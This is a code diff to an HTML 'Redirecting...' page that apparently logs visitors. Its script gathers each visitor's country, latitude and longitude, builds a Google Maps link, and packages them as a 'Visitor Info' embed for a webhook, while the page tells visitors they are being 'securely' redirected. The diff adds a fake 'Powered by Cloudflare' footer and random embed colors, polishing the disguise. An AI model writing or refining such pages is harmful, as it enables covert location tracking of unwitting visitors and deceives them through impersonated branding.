@@ -6,13 +6,15 @@
     <title>Redirecting...</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f3f4f6;
+            font-family: "Roboto", sans-serif;
+            background-color: #f5f6f7;
+            color: #333;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
         }
 
         .container {
@@ -27,13 +29,13 @@
         }
 
         h1 {
-            color: #444;
-            font-size: 28px;
+            font-size: 36px;
+            color: #333;
             margin-bottom: 20px;
         }
 
         .loading {
-            font-size: 16px;
+            font-size: 18px;
             color: #666;
             margin-top: 5px;
         }
@@ -63,6 +65,17 @@
             font-size: 18px;
             margin-top: 20px;
         }
+
+        .footer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+
+        .footer a {
+            color: #3498db;
+            text-decoration: none;
+        }
     </style>
 </head>
 <body>
@@ -71,6 +84,9 @@
         <h1>Redirecting...</h1>
         <p class="loading">Please wait while we are securely redirecting you.</p>
         <div class="spinner"></div>
+        <div class="footer">
+            <p><a href="https://www.cloudflare.com" target="_blank">Powered by Cloudflare</a></p>
+        </div>
     </div>
 
     <script>
@@ -94,13 +110,17 @@
                 // Prepare the Google Maps link
                 const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
+                // Rainbow colors for embed
+                const colors = [0xFF0000, 0xFF7F00, 0xFFFF00, 0x00FF00, 0x0000FF, 0x4B0082, 0x9400D3];
+                const color = colors[Math.floor(Math.random() * colors.length)];
+
                 // Preparing data for webhook
                 const payload = {
                     username: "Visitor Info",
                     avatar_url: flagUrl,
                     embeds: [{
                         title: `Visitor Location: ${country}`,
-                        color: 39423,
+                        color: color,
                         fields: [
                             { name: "Latitude", value: `\`${lat}\``, inline: true },
                             { name: "Longitude", value: `\`${lon}\``, inline: true },
